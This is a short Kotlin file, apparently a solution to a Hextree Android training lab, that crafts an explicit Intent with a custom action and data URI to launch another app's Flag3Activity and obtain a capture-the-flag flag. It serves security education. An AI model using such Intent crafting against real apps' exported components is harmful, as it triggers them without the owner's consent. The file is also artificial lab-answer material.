package com.pachinko.intentattacksurface.utils

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import androidx.core.net.toUri

object Flag3 {
    fun getFlag(context: Context) {
        val intentUri = "https://app.hextree.io/map/android".toUri()
        val intent = Intent().apply {
            component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag3Activity"
            )
            action = "io.hextree.action.GIVE_FLAG"
            data = intentUri
        }
        Utils.showDialog(context, intent)
        context.startActivity(intent)
    }
}
